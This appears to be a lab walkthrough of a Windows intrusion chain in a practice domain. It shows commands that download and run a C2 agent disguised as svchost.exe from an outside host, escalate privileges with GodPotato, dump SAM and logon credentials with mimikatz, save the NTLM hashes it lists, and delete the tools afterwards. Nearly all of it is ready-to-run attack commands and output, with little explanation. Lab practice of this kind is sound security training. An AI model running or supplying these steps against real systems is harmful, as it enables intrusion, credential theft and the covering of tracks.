Try using a C2C server and load a agent on it.
Here we will use Mythic with the c2c agent we created named svchost.exe
```
PS C:\windows\system32\inetsrv> cd /windows/temp
PS C:\windows\temp> wget http://10.2.10.254:8989/svchost.exe -outfile svchost.exe
PS C:\windows\temp> ./svchost.exe
```

On The C2 server, check our the priviledges:
Run agent command:
```
shell whoami /priv
```

Look for:
```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

Or check priviledges quickly:
```
whoami /priv | findstr /i impersonate
```

There are exploits which we can run for this, eg. GodPotatot
To perform privilege escalation, we first need to obtain user access. Then, we must check whether the user has the necessary permissions enabled for SeImpersonatePrivilege.

Link:
```
https://medium.com/@iamkumarraj/godpotato-empowering-windows-privilege-escalation-techniques-400b88403a71
```

Check our the resources section

Priviledge Escalation
On the C2 server agent instructions
```
upload -Path /windows/temp # The selecet GodPotato.exe
```

Once uploaded, you can run:
```
shell c:\Windows\Temp\GodPotato.exe -cmd whoami
```

Upload mimikatz:
```
upload -Path c:\windows\Temp\mimikatz.exe
```

Now lets run mimikatz
```
shell c:\Windows\Temp\GodPotato-NET4.exe -cmd "c:\Windows\TEMP\Mimikatz.exe privilege::debug token::elevate lsadump::sam sekurlsa::logonpasswords exit"
```

Look for user information, e.g.::
```
User Name         : robb.stark
Domain            : NORTH
Logon Server      : WINTERFELL
```

And also the NTLM HASHes:
```
* NTLM     : 831486ac7f26860c9e2f51ac91e1a07a
```

Copy any user information to a file:
```
vi cred

# Paste the username and HASHes into the file:
robb.stark:831486ac7f26860c9e2f51ac91e1a07a
sql_svc:84a5092f53390ea48d660be52b93b804
```

Cleanup the server:
In the C2 server, delete GodPotato and Mimikatz:
```
shell rm GodPotato-NET35.exe
shell rm GodPotato-NET4.exe
shell rm mimikatz.exe
shell rm svchost.exe

```
